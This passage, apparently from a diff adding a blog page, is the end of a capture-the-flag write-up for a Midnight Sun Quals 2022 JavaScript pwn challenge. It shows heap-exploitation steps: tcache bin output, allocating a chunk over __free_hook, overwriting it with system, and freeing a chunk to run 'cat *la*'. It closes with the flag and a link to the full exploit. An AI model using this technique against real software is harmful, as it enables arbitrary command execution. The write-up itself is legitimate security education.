+</span></span></span><span style="display:flex;"><span><span style="color:#8b949e;font-style:italic"></span>chunk2[<span style="color:#a5d6ff">0</span>] <span style="color:#ff7b72;font-weight:bold">=</span> <span style="color:#a5d6ff">0x20746163</span>; <span style="color:#8b949e;font-style:italic">// cat
+</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>Tcachebins[idx=29, size=0x1f0] count=1  ←
+</span></span><span style="display:flex;"><span>    Chunk(addr=0x7ffff7ddfe48, size=0x0, flags=! PREV_INUSE) ...
+</span></span></code></pre></div><h4 id="5-allocate-the-final-chunk-malloc-will-return-__free_hook">5. Allocate the final chunk (<code>malloc</code> will return <code>&amp;__free_hook</code>)</h4>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span>target <span style="color:#ff7b72;font-weight:bold">=</span> <span style="color:#ff7b72">new</span> Uint32Array(<span style="color:#a5d6ff">0x78</span>);
+</span></span><span style="display:flex;"><span>target[<span style="color:#a5d6ff">0</span>] <span style="color:#ff7b72;font-weight:bold">=</span> system;         <span style="color:#8b949e;font-style:italic">// lower  32 bits of system
+</span></span></span><span style="display:flex;"><span><span style="color:#8b949e;font-style:italic"></span>target[<span style="color:#a5d6ff">1</span>] <span style="color:#ff7b72;font-weight:bold">=</span> system_upper;   <span style="color:#8b949e;font-style:italic">// higher 32 bits of system
+</span></span></span></code></pre></div><h4 id="6-free-chunk2-containing-cat-la">6. Free chunk2 containing <code>cat *la*</code></h4>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span>chunk2.midnight() <span style="color:#8b949e;font-style:italic">// free the chunk, calling `system(&#34;cat *la*&#34;)`
+</span></span></span></code></pre></div><!-- raw HTML omitted -->
+<p><img src="hfs_browser_flag.png" alt="alt"></p>
+<p>Running on the server got us the flag: <code>midnight{c4nt_h4v3_Us3_4ft3r_fr33s_1f_yoU_d0nt_fr33}</code></p>
+<h2 id="full-exploit">Full exploit</h2>
+<p><a href="pwn.js">pwn.js</a></p>
+
+		</section>
+
+		<div class="post-tags">
+			
+			
+			<nav class="nav tags">
+				<ul class="tags">
+					
+					<li><a href="/tags/midnightsunquals22">midnightsunquals22</a></li>
+					
+					<li><a href="/tags/pwn">pwn</a></li>
+					
+					<li><a href="/tags/javascript">javascript</a></li>
+					
+					<li><a href="/tags/writeup">writeup</a></li>
+					
+				</ul>
+			</nav>
+			
+			
+		</div>
+		</article>
+</main>
+<footer>
+  <div style="display:flex"><a class="soc" href="https://example.com" rel="me" title="GitHub"><i data-feather="github"></i></a>
+    <a class="border"></a><a class="soc" href="https://example.com" rel="me" title="Twitter"><i data-feather="twitter"></i></a>
+    <a class="border"></a><a class="soc" href="https://example.com" rel="me" title="BlueSky"><i data-feather="bluesky"></i></a>
+    <a class="border"></a></div>
+  <div class="footer-info">
+    2024  <a
+      href="https://github.com/athul/archie">Archie Theme</a> | Built with <a href="https://gohugo.io">Hugo</a>
+  </div>
+</footer>
+<script>
+  feather.replace()
+</script></div>
+    </body>
+</html>
